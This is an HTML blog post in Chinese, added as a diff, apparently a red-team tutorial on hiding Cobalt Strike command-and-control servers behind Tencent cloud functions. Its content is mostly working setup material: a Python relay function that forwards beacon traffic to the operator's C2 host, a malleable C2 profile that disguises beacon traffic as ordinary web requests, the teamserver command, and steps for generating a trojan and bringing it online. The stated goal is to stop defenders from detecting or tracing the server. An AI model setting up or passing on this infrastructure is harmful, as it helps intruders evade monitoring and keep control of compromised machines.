@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>流量加密之C2隐藏 - T0x1c</title>
+
+  
+    <meta name="description" content="Cobalt Strike（以下简称CS）是一款框架式渗透工具，可模拟APT在攻防对抗中进行内网渗透。同时它还集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成、甚至包括站点克隆获取浏览器信息等。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="流量加密之C2隐藏">
+<meta property="og:url" content="https://toxic80l.github.io/post/2634d38d/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Cobalt Strike（以下简称CS）是一款框架式渗透工具，可模拟APT在攻防对抗中进行内网渗透。同时它还集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成、甚至包括站点克隆获取浏览器信息等。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%882.33.08.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.00.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.02.22.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.06.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.08.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.11.21.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.15.09.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.27.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.24.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.26.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.39.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.49.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.53.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-12%2004.53.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.42.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.24.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2002.59.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.02.52.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.04.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2003.39.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.19.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2011.29.56.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-19%2004.26.47.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2011.32.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2015.27.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.38.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.46.02.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.49.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.51.58.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2016.53.33.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-20%2017.49.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.20.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.26.44.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.32.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.47.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2022-04-21%2000.48.32.png">
+<meta property="article:published_time" content="2022-04-22T01:31:08.000Z">
+<meta property="article:modified_time" content="2022-04-23T14:42:14.989Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="流量隐藏">
+<meta property="article:tag" content="CDN">
+<meta property="article:tag" content="域前置">
+<meta property="article:tag" content="云函数">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://toxic80l.github.io/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%882.33.08.png">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BA%91%E5%87%BD%E6%95%B0"><span class="toc-text">0x01 云函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%91%E5%87%BD%E6%95%B0%E4%BB%8B%E7%BB%8D"><span class="toc-text">云函数介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E4%BA%91%E5%87%BD%E6%95%B0"><span class="toc-text">创建云函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B5%8B%E8%AF%95"><span class="toc-text">C2服务端测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E4%B8%8A%E7%BA%BF"><span class="toc-text">C2上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-CDN%E3%80%81%E5%9F%9F%E5%89%8D%E7%BD%AE"><span class="toc-text">0x02 CDN、域前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%89%8D%E7%BD%AE%E4%BB%8B%E7%BB%8D"><span class="toc-text">域前置介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN%E4%BB%8B%E7%BB%8D"><span class="toc-text">CDN介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%AD%E4%B9%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">购买服务器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%AD%E4%B9%B0%E5%9F%9F%E5%90%8D"><span class="toc-text">购买域名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AECDN"><span class="toc-text">配置CDN</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%B5%8B%E8%AF%95-1"><span class="toc-text">C2服务端测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C2%E4%B8%8A%E7%BA%BF-1"><span class="toc-text">C2上线</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-text">0x03 总结</span></a></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-04-22T01:31:08.000Z">2022-04-22</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>流量加密之C2隐藏</span></h1>
+<p>Cobalt Strike（以下简称CS）是一款框架式渗透工具，可模拟APT在攻防对抗中进行内网渗透。同时它还集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成、甚至包括站点克隆获取浏览器信息等。<span id="more"></span>作为网络安全领域的神器，目前CS的通信流量已经能被成熟的IDS、IPS识别检测，一旦被防守人员发现CS的流量或溯源到CS的服务端的IP地址，渗透入侵可能会因此功亏一篑。所以我们需要加密流量保护CS服务器以免被防守方的安全监控检测出来甚至溯源我们的CS服务器，目前常用的隐藏手段包括域前置、CDN、云函数等，接下来我将介绍这几种常见的隐藏C2的方式。</p>
+<h2 id="0x01-云函数"><a href="#0x01-云函数" class="headerlink" title="0x01 云函数"></a>0x01 云函数</h2><h3 id="云函数介绍"><a href="#云函数介绍" class="headerlink" title="云函数介绍"></a>云函数介绍</h3><p>云函数（Serverless Cloud Function，SCF）主要是为企业和开发者们提供的无服务器执行环境，可在无需购买和管理服务器的情况下运行代码。开发者只需使用平台支持的语言编写核心代码并设置代码运行的条件，即可在云基础设施上弹性、安全地运行代码。</p>
+<p>利用云函数我们可以很好地隐藏自己，主要是因为云函数采用多地部署模式，每次请求都会切换不同的IP地址，虽然默认访问域名还是会被防守方获取到，但是一般情况下防守方无法根据API直接从腾讯云获取我们的个人信息。因此我们可以通过云函数的特性来隐藏CS服务端。</p>
+<h3 id="创建云函数"><a href="#创建云函数" class="headerlink" title="创建云函数"></a>创建云函数</h3><p>在某云上创建自定义云函数同时设置函数名称，具体设置如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%882.33.08.png" alt="截屏2021-12-23 上午2.33.08"></p>
+<p>在其中写入云函数的服务端脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf8</span></span><br><span class="line"><span class="keyword">import</span> json,requests,base64</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_handler</span>(<span class="params">event, context</span>):</span></span><br><span class="line">    response = &#123;&#125;</span><br><span class="line">    path = <span class="literal">None</span></span><br><span class="line">    headers = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 根据自己云服务器的地址修改</span></span><br><span class="line">        C2=<span class="string">&#x27;http://x.x.x.x:80&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;path&#x27;</span> <span class="keyword">in</span> event.keys():</span><br><span class="line">            path=event[<span class="string">&#x27;path&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;headers&#x27;</span> <span class="keyword">in</span> event.keys():    </span><br><span class="line">            headers=event[<span class="string">&#x27;headers&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;httpMethod&#x27;</span> <span class="keyword">in</span> event.keys() <span class="keyword">and</span> event[<span class="string">&#x27;httpMethod&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span> :</span><br><span class="line">            resp=requests.get(C2+path,headers=headers,verify=<span class="literal">False</span>) </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp=requests.post(C2+path,data=event[<span class="string">&#x27;body&#x27;</span>],headers=headers,verify=<span class="literal">False</span>)</span><br><span class="line">            <span class="built_in">print</span>(resp.headers)</span><br><span class="line">            <span class="built_in">print</span>(resp.content)</span><br><span class="line">        response=&#123;</span><br><span class="line">            <span class="string">&quot;isBase64Encoded&quot;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&quot;statusCode&quot;</span>: resp.status_code,</span><br><span class="line">            <span class="string">&quot;headers&quot;</span>: <span class="built_in">dict</span>(resp.headers),</span><br><span class="line">            <span class="string">&quot;body&quot;</span>: <span class="built_in">str</span>(base64.b64encode(resp.content))[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.00.27.png" alt="截屏2021-12-23 上午3.00.27"></p>
+<p>配置触发器选择<code>api 网关触发</code>，其他设置如下：<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.02.22.png" alt="截屏2021-12-23 上午3.02.22"></p>
+<p>编辑 API 并修改路径为<code>/</code>，修改完成后发布服务<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.06.42.png" alt="截屏2021-12-23 上午3.06.42"></p>
+<h3 id="C2服务端测试"><a href="#C2服务端测试" class="headerlink" title="C2服务端测试"></a>C2服务端测试</h3><p>在 CS 服务器定制 malleable C2 以用于隐藏流量。malleable C2 主要通过修改 C2 配置文件、更改 beacon 的 payload 的属性和行为来伪造正常的通信流量。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> sample_name <span class="string">&quot;func&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> sleeptime <span class="string">&quot;3000&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> jitter    <span class="string">&quot;0&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> maxdns    <span class="string">&quot;255&quot;</span>;</span><br><span class="line"><span class="built_in">set</span> useragent <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span>;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/x&quot;</span>;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;SESSIONID=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">http-stager &#123;  </span><br><span class="line">    <span class="built_in">set</span> uri_x86 <span class="string">&quot;/vue.min.js&quot;</span>;</span><br><span class="line">    <span class="built_in">set</span> uri_x64 <span class="string">&quot;/bootstrap-2.min.js&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">http-post &#123;</span><br><span class="line">    <span class="built_in">set</span> uri <span class="string">&quot;/api/y&quot;</span>;</span><br><span class="line">    client &#123;</span><br><span class="line">        header <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">        <span class="built_in">id</span> &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend <span class="string">&quot;JSESSION=&quot;</span>;</span><br><span class="line">            header <span class="string">&quot;Cookie&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span>;</span><br><span class="line">        header <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span>;</span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            <span class="built_in">print</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>创建完后将其命名为<code>api.profile</code>并通过 teamserver 启动服务端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver x.x.x.x xxx api.profile</span><br></pre></td></tr></table></figure>
+<h3 id="C2上线"><a href="#C2上线" class="headerlink" title="C2上线"></a>C2上线</h3><p>在云函数服务中我们可以找到默认的API访问地址，需要注意该地址是云函数利用的关键。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.08.53.png" alt="截屏2021-12-23 上午3.08.53"></p>
+<p>在CS客户端创建监听器<code>cs_hidden</code>，将返回地址设置为默认API访问地址<code>service-xxxx-xxx.xx.xx.tencentcs.com</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.11.21.png" alt="截屏2021-12-23 上午3.11.21"></p>
+<p>生成相应木马并设置监听器为刚创建的<code>cs_hidden</code><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.15.09.png" alt="截屏2021-12-23 上午3.15.09"></p>
+<p>执行后可成功上线 CS，如果外网地址在不断变化，那么就说明云函数利用成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.27.png" alt="截屏2021-12-23 上午3.18.27"></p>
+<p>在云函数的日志中我们可以追查到请求已调用成功<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.18.42.png" alt="截屏2021-12-23 上午3.18.42"></p>
+<p>尝试将木马放入微步云沙箱进行检测。可以发现我们的CS上又出现一台主机<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/2634d38d/%E6%88%AA%E5%B1%8F2021-12-23%20%E4%B8%8A%E5%8D%883.24.14.png" alt="截屏2021-12-23 上午3.24.14"></p>
